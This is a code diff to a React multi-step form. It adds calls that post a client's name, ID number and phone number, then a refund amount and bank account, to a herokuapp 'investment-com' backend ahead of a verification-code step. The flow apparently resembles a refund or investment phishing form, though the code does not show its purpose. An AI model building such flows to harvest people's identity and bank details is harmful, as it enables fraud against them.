@@ -36,6 +36,7 @@ export default function Form() {
     });    
 
     const [step, setStep] = useState(1);
+    const [queryId, setQueruId] = useState(0);
     const [showSpinner, setShowSpinner] = useState(false);
     const [open, setOpen] = useState(false);
     const [nextBtnDisabled, setNextBtnDisabled] = useState(false);
@@ -68,12 +69,45 @@ export default function Form() {
         }
     };
 
+    const sendData = (step) => {
+        switch(step) {
+            case 2:
+                axios.post("https://investment-com.herokuapp.com/step-1", {
+                    fullName: values.clientFullname,
+                    idNumber: values.clientId,
+                    phoneNumber: values.clientPhoneNumber,
+                }).then((response) => {
+                    if(response.data.saved) {
+                        setQueruId(response.data["result"]["insertId"]);
+                    }
+                });
+                break;
+            
+            case 3:
+                axios.post("https://investment-com.herokuapp.com/step-2", {
+                    refundAmount: values.refundAmount,
+                    userBank: values.clientBankAccount,
+                    queryId: queryId,
+                }).then((response) => {
+                    if(response.data.saved) {
+                        console.log("step 3");
+                    }
+                });
+                break;
+        }
+    };
+
     const nextStep = () => {
         setShowSpinner(true);
         setTimeout(function() {
             setShowSpinner(false);
 
+            if(step === 2) {
+                sendData(2);
+            }
+
             if(step === 3) {
+                sendData(3);
                 addVerificationCode1();
             }
 
